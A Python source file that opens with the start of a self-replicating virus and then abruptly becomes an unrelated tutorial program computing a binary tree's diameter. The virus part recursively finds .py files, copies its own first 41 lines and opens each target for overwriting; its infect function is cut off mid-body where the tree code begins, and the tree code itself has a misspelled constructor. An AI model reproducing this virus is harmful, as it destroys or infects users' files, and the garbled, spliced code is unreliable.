#!/usr/bin/python 
import os, datetime, inspect 
DATA_TO_INSERT = "GEEKSFORGEEKS"
  
#search for target files in path
def search(path):  
    filestoinfect = [] 
    filelist = os.listdir(path) 
    for filename in filelist: 
          
        #If it is a folder
        if os.path.isdir(path+"/"+filename):  
            filestoinfect.extend(search(path+"/"+filename)) 
              
        #If it is a python script -> Infect it    
        elif filename[-3:] == ".py":
              
            #default value
            infected = False  
            for line in open(path+"/"+filename): 
                if DATA_TO_INSERT in line: 
                    infected = True
                    break
            if infected == False: 
                filestoinfect.append(path+"/"+filename) 
    return filestoinfect 
  
#changes to be made in the target file 
def infect(filestoinfect): 
    target_file = inspect.currentframe().f_code.co_filename 
    virus = open(os.path.abspath(target_file)) 
    virusstring = "" 
    for i,line in enumerate(virus): 
        if i>=0 and i <41: 
            virusstring += line 
    virus.close 
    for fname in filestoinfect: 
        f = open(fname) 
        temp = f.read() 
        f.close() 
        f = open(fname,"w") 
# Python3 program to find the diameter of a binary tree
# A binary tree Node
 
 
class Node:
 
    # Constructor to create a new Node
    def __init__(self, data):
        self.data = data
        self.left = self.right = None
 
# utility class to pass height object
 
 
class Height:
    def __init(self):
        self.h = 0
 
# Optimised recursive function to find diameter
# of binary tree
 
 
def diameterOpt(root, height):
 
    # to store height of left and right subtree
    lh = Height()
    rh = Height()
 
    # base condition- when binary tree is empty
    if root is None:
        height.h = 0
        return 0
 
    # ldiameter --> diameter of left subtree
    # rdiameter  --> diameter of right subtree
 
    # height of left subtree and right subtree is obtained from lh and rh
    # and returned value of function is stored in ldiameter and rdiameter
 
    ldiameter = diameterOpt(root.left, lh)
    rdiameter = diameterOpt(root.right, rh)
 
    # height of tree will be max of left subtree
    # height and right subtree height plus1
 
    height.h = max(lh.h, rh.h) + 1
 
    # return maximum of the following
    # 1)left diameter
    # 2)right diameter
    # 3)left height + right height + 1
    return max(lh.h + rh.h + 1, max(ldiameter, rdiameter))
 
# function to calculate diameter of binary tree
 
 
def diameter(root):
    height = Height()
    return diameterOpt(root, height)
 
 
# Driver Code
if __name__ == "__main__":
    root = Node(1)
    root.left = Node(2)
    root.right = Node(3)
    root.left.left = Node(4)
    root.left.right = Node(5)
 
    """
  Constructed binary tree is
              1
          /   \
          2      3
        /  \
      4     5
  """
 
    print("The diameter of the binary tree is:", end=" ")
    # Function Call
    print(diameter(root))
 
# This code is contributed by Shweta Singh(shweta44)
# Time Complexity: O(N)
# Space Complexity: O(N) due to recursive calls.